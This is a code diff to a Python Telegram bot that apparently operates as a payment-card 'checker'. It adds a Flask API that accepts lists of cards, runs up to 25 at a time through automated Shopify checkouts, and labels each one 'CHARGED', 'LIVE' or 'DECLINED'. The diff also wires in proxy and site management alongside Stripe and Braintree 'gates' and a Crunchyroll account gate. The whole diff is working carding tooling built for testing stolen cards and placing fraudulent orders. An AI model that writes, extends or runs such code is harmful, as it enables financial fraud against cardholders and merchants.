@@ -24,8 +24,103 @@ from telegram.ext import (
 from telegram.error import ChatMigrated, TelegramError
 from dotenv import load_dotenv
 import sys
+from flask import Flask, request, jsonify
+import threading
+
+app = Flask(__name__)
+
+@app.route('/api/shopify/mass', methods=['POST'])
+def shopify_mass_api():
+    data = request.json
+    if not data or 'cards' not in data:
+        return jsonify({"status": "error", "message": "Missing cards data"}), 400
+    
+    cards = data.get('cards')
+    if not isinstance(cards, list):
+        return jsonify({"status": "error", "message": "Cards must be a list"}), 400
+
+    async def run_mass_check():
+        import shopify_auto_checkout as sx
+        semaphore = asyncio.Semaphore(25)
+        
+        async def sem_check(card):
+            async with semaphore:
+                result = await sx.process_single_card(card)
+                
+                # Determine status for API response based on script logic
+                result_msg = result.get('message', '').upper()
+                if "CHARGED" in result_msg or "ORDER PLACED" in result_msg:
+                    status = "CHARGED 💰"
+                elif "LIVE" in result_msg or "APPROVED" in result_msg or "AVS FAILED" in result_msg or "INVALID CVV" in result_msg or "3D SECURE" in result_msg:
+                    status = "LIVE ✅"
+                else:
+                    status = "DECLINED ❌"
+                    
+                return {
+                    "card": card,
+                    "result": status,
+                    "response": result.get('message', '')
+                }
+
+        tasks = [sem_check(card) for card in cards]
+        results = await asyncio.gather(*tasks)
+        return results
+
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        results = loop.run_until_complete(run_mass_check())
+        return jsonify({"status": "success", "results": results})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+@app.route('/api/shopify', methods=['POST'])
+def shopify_api():
+    data = request.json
+    if not data or 'card' not in data:
+        return jsonify({"status": "error", "message": "Missing card data"}), 400
+    
+    card_info = data.get('card')
+    # Use a dummy user object for the formatter
+    class DummyUser:
+        def __init__(self):
+            self.username = "API_User"
+            self.first_name = "API"
+
+    async def run_check():
+        import shopify_auto_checkout as sx
+        result = await sx.process_single_card(card_info)
+        
+        # Determine status for API response based on script logic
+        result_msg = result.get('message', '').upper()
+        if "CHARGED" in result_msg or "ORDER PLACED" in result_msg:
+            status = "CHARGED 💰"
+        elif "LIVE" in result_msg or "APPROVED" in result_msg or "AVS FAILED" in result_msg or "INVALID CVV" in result_msg or "3D SECURE" in result_msg:
+            status = "LIVE ✅"
+        else:
+            status = "DECLINED ❌"
+            
+        return {
+            "status": "success",
+            "card": card_info,
+            "result": status,
+            "response": result.get('message', ''),
+            "full_data": result
+        }
+
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        result = loop.run_until_complete(run_check())
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+def run_flask():
+    app.run(host='0.0.0.0', port=5000)
+
 sys.path.insert(0, 'gates/stripe')
-sys.path.insert(0, 'gates/shopify')
+sys.path.insert(0, 'gates/shopify_auto_site')
 sys.path.insert(0, 'gates/braintree')
 sys.path.insert(0, 'acc gates/crunchyroll')
 from gates.stripe.main import (
@@ -39,19 +134,18 @@ from gates.stripe.main import (
     AWAITING_AUTH_MODE,
     AWAITING_CREDENTIALS
 )
-from gates.shopify.main import (
-    sh as shopify_sh,
-    msh as shopify_msh,
-    seturl as shopify_seturl,
-    myurl as shopify_myurl,
-    rmurl as shopify_rmurl,
-    addp as shopify_addp,
-    rp as shopify_rp,
-    lp as shopify_lp,
-    cp as shopify_cp,
-    chkurl as shopify_chkurl,
-    mchku as shopify_mchku
+# Re-import from corrected path
+from gates.shopify_auto_site.main import (
+    sx_command,
+    msx_command,
+    mssx_command,
+    addsx_command,
+    addpp_command,
+    bl_command,
+    sbl_command,
+    ubl_command
 )
+import shopify_auto_checkout as shopify_sh
 from gates.braintree.bot import (
     br_command as braintree_br,
     mbr_command as braintree_mbr,
@@ -1263,6 +1357,22 @@ async def mssx_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_document(document=open("working_shopify.txt", "rb"), caption="✅ Working Shopify Sites")
     await update.message.reply_document(document=open("dead_shopify.txt", "rb"), caption="❌ Non-Shopify or Error Sites")
 
+def load_shopify_settings():
+    try:
+        if os.path.exists('gates/shopify_auto_site/shopify_config.json'):
+            with open('gates/shopify_auto_site/shopify_config.json', 'r') as f:
+                return {'settings': json.load(f)}
+    except:
+        pass
+    return {'settings': {'sites': [], 'proxies': []}}
+
+def save_shopify_settings(settings):
+    try:
+        with open('gates/shopify_auto_site/shopify_config.json', 'w') as f:
+            json.dump(settings['settings'], f, indent=2)
+    except:
+        pass
+
 async def addsx_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id): return
     
@@ -1310,6 +1420,44 @@ async def addpp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     save_shopify_settings(settings)
     
     await update.message.reply_text(f"✅ Added {len(new_proxies) - len(current_proxies)} proxies. Total: {len(new_proxies)}")
+
+async def bl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /bl command to block responses (Admin only)"""
+    if not is_admin(update.effective_user.id):
+        await update.message.reply_text("❌ Admin only command!")
+        return
+    if not context.args:
+        await update.message.reply_text("❌ Provide response to block")
+        return
+    response = " ".join(context.args)
+    if response not in shopify_sh.GLOBAL_STATE.blocked_responses:
+        shopify_sh.GLOBAL_STATE.blocked_responses.append(response)
+        shopify_sh.GLOBAL_STATE.save_config()
+    await update.message.reply_text(f"✅ Added to block list: {response}")
+
+async def sbl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /sbl command to show blocked responses"""
+    if not shopify_sh.GLOBAL_STATE.blocked_responses:
+        await update.message.reply_text("📂 Block list is empty")
+        return
+    resp = "📂 Blocked Responses:\n" + "\n".join([f"- {r}" for r in shopify_sh.GLOBAL_STATE.blocked_responses])
+    await update.message.reply_text(resp)
+
+async def ubl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /ubl command to unblock responses (Admin only)"""
+    if not is_admin(update.effective_user.id):
+        await update.message.reply_text("❌ Admin only command!")
+        return
+    if not context.args:
+        await update.message.reply_text("❌ Provide response to unblock")
+        return
+    response = " ".join(context.args)
+    if response in shopify_sh.GLOBAL_STATE.blocked_responses:
+        shopify_sh.GLOBAL_STATE.blocked_responses.remove(response)
+        shopify_sh.GLOBAL_STATE.save_config()
+        await update.message.reply_text(f"✅ Removed from block list: {response}")
+    else:
+        await update.message.reply_text("❌ Response not found in block list")
 
 async def bin_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_registered(update.effective_user.id):
@@ -6565,6 +6713,9 @@ def main():
     application.add_handler(CommandHandler("mssx", mssx_command))
     application.add_handler(CommandHandler("addsx", addsx_command))
     application.add_handler(CommandHandler("addpp", addpp_command))
+    application.add_handler(CommandHandler("bl", bl_command))
+    application.add_handler(CommandHandler("sbl", sbl_command))
+    application.add_handler(CommandHandler("ubl", ubl_command))
 
     # Core Commands
     application.add_handler(CommandHandler("start", start))
@@ -6573,7 +6724,7 @@ def main():
     application.add_handler(CommandHandler("cmds", cmd))
     application.add_handler(CallbackQueryHandler(button_callback))
 
-    # Remove redundant handlers if they exist
+    # Remove redundant or undefined handlers
     application.add_handler(CommandHandler("bin", bin_check))
     application.add_handler(CommandHandler("mbin", mbin_check))
     application.add_handler(CommandHandler("vbv", vbv_command))
@@ -6588,19 +6739,20 @@ def main():
     application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/mchk'), mass_check_stripe_file))
     application.add_handler(CommandHandler("mchk", check_stripe_mass))
     application.add_handler(CommandHandler("setsurl", setsurl_command))
-    application.add_handler(CommandHandler("sh", check_shopify))
-    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/msh'), mass_check_shopify_file))
-    application.add_handler(CommandHandler("msh", check_shopify_mass))
+    # Shopify handlers already handled by our new sx_command logic
+    # application.add_handler(CommandHandler("sh", check_shopify))
+    # application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/msh'), mass_check_shopify_file))
+    # application.add_handler(CommandHandler("msh", check_shopify_mass))
     application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-    application.add_handler(CommandHandler("seturl", shopify_seturl))
-    application.add_handler(CommandHandler("myurl", shopify_myurl))
-    application.add_handler(CommandHandler("rmurl", shopify_rmurl))
-    application.add_handler(CommandHandler("addp", shopify_addp))
-    application.add_handler(CommandHandler("rp", shopify_rp))
-    application.add_handler(CommandHandler("lp", shopify_lp))
-    application.add_handler(CommandHandler("cp", shopify_cp))
-    application.add_handler(CommandHandler("chkurl", shopify_chkurl))
-    application.add_handler(CommandHandler("mchku", shopify_mchku))
+    # application.add_handler(CommandHandler("seturl", shopify_seturl))
+    # application.add_handler(CommandHandler("myurl", shopify_myurl))
+    # application.add_handler(CommandHandler("rmurl", shopify_rmurl))
+    # application.add_handler(CommandHandler("addp", shopify_addp))
+    # application.add_handler(CommandHandler("rp", shopify_rp))
+    # application.add_handler(CommandHandler("lp", shopify_lp))
+    # application.add_handler(CommandHandler("cp", shopify_cp))
+    # application.add_handler(CommandHandler("chkurl", shopify_chkurl))
+    # application.add_handler(CommandHandler("mchku", shopify_mchku))
     application.add_handler(CommandHandler("br", check_braintree))
     application.add_handler(braintree_url_handler)
     application.add_handler(CommandHandler("myburl", braintree_myburl))
@@ -6676,6 +6828,10 @@ def main():
     application.add_handler(CallbackQueryHandler(button_callback))
     
     logger.info("Bot started successfully!")
+    # Start Flask API in a separate thread
+    flask_thread = threading.Thread(target=run_flask, daemon=True)
+    flask_thread.start()
+    
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == '__main__':
